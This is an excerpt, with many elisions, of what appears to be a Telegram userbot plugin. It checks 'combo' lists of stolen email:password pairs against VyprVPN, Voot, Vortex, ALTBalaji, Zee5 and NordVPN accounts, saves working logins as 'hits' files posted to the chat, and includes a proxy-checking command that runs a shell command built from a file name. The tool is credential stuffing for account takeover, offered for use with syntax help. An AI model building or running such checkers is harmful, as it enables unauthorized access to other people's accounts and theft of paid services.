...
@friday.on(friday_on_cmd(pattern="cvy1$"))
async def vortex(event):
    await event.edit('`Checking Your Combos. This May Take Time Depending On Combos...`')
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    ...
    os.remove(starky)
    if len(stark_dict) > 100:
        await event.edit('`Woah, Thats A Lot Of Combos. Keep 99 As Limit`')
        return
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
   ...
   "Content-Type" : "application/x-www-form-urlencoded"
    ...
    if len(hits_dict) == 0:
        ...
        return
    with open("vyprhits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + ' | @Gβε₷hMod\n')
    await borg.send_file(
        event.chat_id, "vyprhits.txt", caption=f"**!VYPR HITS!** \n**vyprhits :** `{hits}` \n**BAD :** `{bads}`"
    )
    os.remove("vyprhits.txt")



@Jarvis.on(admin_cmd(pattern="cvo2$"))
async def voot(event):
    ...
    for i in normal_dict:
        ...
        if a != None:
            ...
            if c == 1906:
              ...
              if len(good_dict) == 0:
                return
              with open("voothits.txt", "w") as hitfile:
                for s in good_dict:
                  hitfile.write(s + ' | @Gβε₷hMod')
                await borg.send_file(event.chat_id, "voothits.txt", caption=f"**!VOOT HITS!** \n**voothits :** `{hits}` \n**BAD :** `{bady}`")
                os.remove("voothits.txt")
                return
    ...
    with open("voothits.txt", "w") as hitfile:
        for s in good_dict:
            hitfile.write(s + ' | @Gβε₷hMod\n')
    await borg.send_file(
        event.chat_id, "voothits.txt", caption=f"**!VOOT HITS!** \n**voothits :** `{hits}` \n**BAD :** `{bady}`"
    )
    os.remove("voothits.txt")


   
@modified.on(modified_cmd(pattern="cvx3$"))
async def vortex(event):
    await event.edit('`Checking Your Combos. This May Take Time....`')
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    ...
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("vortexhits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + ' | @Gβε₷hMod\n')
    await borg.send_file(
        event.chat_id, "vortexhits.txt", caption=f"**!VORTEX HITS!** \n**vortexhits :** `{hits}` \n**BAD :** `{bads}`"
    )
    os.remove("vortexhits.txt")





@modified.on(modified_cmd(pattern="caj4$"))
async def altbalaji(event):
    ...
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("altbahits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + ' | @Gβε₷hMod\n')
    await borg.send_file(
        event.chat_id, "altbahits.txt", caption=f"**!ALTBALAJI HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
    )
    os.remove("altbahits.txt")




@modified.on(modified_cmd(pattern="cze5$"))
async def zee5(event):
    await event.edit('`Checking Your Combos. This May Take Time Depending On Combos list....`')
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    ...
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("zeehits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + ' | @Gβε₷hMod\n')
    await borg.send_file(
        event.chat_id, "zeehits.txt", caption=f"**!ZEE5 HITS!** \n**zeehits :** `{hits}` \n**BAD :** `{bads}`"
    )
    os.remove("zeehits.txt")



@modified.on(modified_cmd(pattern="cno6$"))
async def vypr(event):
    ...
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("nordhits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + ' | @Gβε₷hMod\n')
    await borg.send_file(
        event.chat_id, "nordhits.txt", caption=f"**!NORD HITS!** \n**nordhits :** `{hits}` \n**BAD :** `{bads}`"
    )
    os.remove("nordhits.txt")



@borg.on(admin_cmd(pattern="cproxy"))
async def _(event):
    if event.fwd_from:
        return
    ...
    cmd = f"python3 -m PyProxyToolkit.Console -i {escobar} -o goodproxy.txt -t 80 -x 20 -s httpbinStrategy"
    
    os.system(cmd)
    
    file = open("goodproxy.txt","r") 
    Counter = 0
    Content = file.read() 
    ...
    if Counter<=0:
      ...
      file1 = open("goodproxy.txt", "a")
      file1.write("\nCHECKED BY ⪼⪼ {BOT_N_N} ") 
      file1.close() 
      await borg.send_file(event.chat_id, "goodproxy.txt", caption=f"**PROXIES CHECKED**\n**GOOD PROXIES: ** {Counter}\n\n**CHECKED BY {BOT_LIN}.**")
      os.remove(escobar)
...
\n\n**Syntax : **`.cvy1 <reply to combo>`\
\n**Usage :** Checks for VYPR accounts from combo.\
\n\n**Syntax : **`.cvo2 <reply to combo>`\
\n**Usage :** Checks for Voot accounts from combo.\
\n\n**Syntax : **`.cvx3 <reply to combo>`\
\n**Usage :** Checks for Vortex accounts from combo.\
\n\n**Syntax : **`.caj4 <reply to combo>`\
\n**Usage :** Checks for ALTBALAJI accounts from combo.\
\n\n**Syntax : **`.cze5 <reply to combo>`\
\n**Usage :** Checks for Zee5 accounts from combo.\
\n\n**Syntax : **`.cno6 <reply to combo>`\
\n**Usage :** Checks for Nord VPN accounts from combo.\
\n\n**Syntax : **`.cproxy <reply to proxies file>`\
